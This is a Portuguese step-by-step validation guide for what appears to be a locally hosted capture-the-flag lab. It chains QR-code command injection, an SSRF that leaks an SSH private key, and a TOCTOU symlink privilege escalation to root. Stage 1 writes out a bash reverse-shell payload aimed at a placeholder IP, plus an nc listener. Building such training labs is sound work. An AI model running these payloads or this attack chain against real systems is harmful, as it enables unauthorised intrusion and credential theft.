# Guia de Execução / Teste Manual

> A preencher conforme a implementação avança. Esqueleto inicial abaixo para já
> estruturar o passo a passo reproduzível, comando por comando.

## Pré-requisitos

- Docker e Docker Compose instalados.
- Um cliente de SSH.
- Uma ferramenta para gerar QR Code a partir de texto arbitrário (ex.: `qrencode`).

## Subindo o ambiente

```bash
cd deploy
docker compose up --build -d
docker compose logs -f   # acompanhar inicialização
```

## Etapa 1 — Acesso inicial

Implementada. Validação manual:

- [ ] Acessar `http://localhost:8000` no navegador.
- [ ] Gerar uma imagem de QR Code contendo, por exemplo:
      `0; bash -c 'bash -i >& /dev/tcp/SEU_IP/4444 0>&1'`
      (qualquer gerador de QR Code a partir de texto serve, ex.: `qrencode -o payload.png "0; bash -c 'bash -i >& /dev/tcp/SEU_IP/4444 0>&1'"`).
- [ ] Subir listener local antes do upload: `nc -lvnp 4444`.
- [ ] Fazer upload da imagem do QR Code em `http://localhost:8000`.
- [ ] Confirmar shell recebida como `ru_web` (`whoami`).
- [ ] Ler `/home/ru_web/user.txt` (flag 1).

Validação automatizada (requer o container no ar — ver `tests/exploit_etapa1.py`):

```bash
cd tests
pip install -r requirements.txt
python3 exploit_etapa1.py --target-url http://localhost:8000 \
  --listen-host host.docker.internal --listen-port 4444
```

Testes em camadas (sem precisar do container; rodados nesta sessão de design):

```bash
cd tests
python3 test_decode_qr.py     # camada 1: ciclo QR (gerar imagem -> decodificar) isolado
python3 test_app_client.py    # camada 2: Flask app.test_client(), sem rede/container
```

## Etapa 2 — Pivot até o painel

- [ ] `ss -tulpn` a partir do shell em `ru_web`, confirmar porta `8081` só em
      `127.0.0.1`.
- [ ] (Opcional) Túnel: `ssh -L 8081:127.0.0.1:8081 ...` — a documentar o método exato
      de acesso ao shell inicial que viabiliza isso.
- [ ] Acessar o painel e localizar o campo de endpoint de "Verificar integração com o
      Sistema Acadêmico".

## Etapa 3 — SSRF

- [ ] Confirmar porta `9090` só em `127.0.0.1` (não exposta externamente).
- [ ] Submeter `endpoint=http://127.0.0.1:9090/admin/credenciais` no campo vulnerável
      (via painel ou via `curl` direto do shell de `ru_web`).
- [ ] Copiar a chave SSH privada retornada, salvar em arquivo local, `chmod 600`.
- [ ] `ssh -p 2222 -i <arquivo-chave> operador_caixa@localhost`.
- [ ] Ler `/home/operador_caixa/user.txt` (flag 2).

## Etapa 4 — Escalação de privilégio

- [ ] Como `operador_caixa`, localizar o diretório/script do job de conciliação de
      caixa.
- [ ] Identificar o padrão TOCTOU (checagem de existência seguida de leitura/escrita
      sem `O_NOFOLLOW`).
- [ ] Plantar symlink malicioso apontando para o alvo definido em `decisoes.md`.
- [ ] Aguardar a próxima execução (até 90s).
- [ ] Confirmar efeito como root e ler `/root/root.txt` (flag 3).

## Derrubando o ambiente

```bash
docker compose down
```
